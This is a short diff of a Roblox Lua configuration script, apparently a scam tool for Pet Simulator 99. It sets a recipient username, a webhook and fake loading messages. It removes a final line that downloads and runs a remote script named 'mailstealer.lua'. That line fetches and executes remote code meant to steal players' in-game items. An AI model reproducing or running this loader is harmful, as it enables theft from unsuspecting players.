@@ -1,7 +1,7 @@
 --[[ Main Config ]]--
 Username = "asjk587"
 AntiLeave = true
-GemNumber = 10000 --
+GemNumber = 10000 
 
 --[[ Webhook Config ]]--
 Webhook = "Your Webhook Here"
@@ -15,4 +15,3 @@ Text4 = "Loading."
 Text5 = "Almost Done Loading.."
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Dovyl/Pet-Simulator-99/main/mailstealer.lua"))()
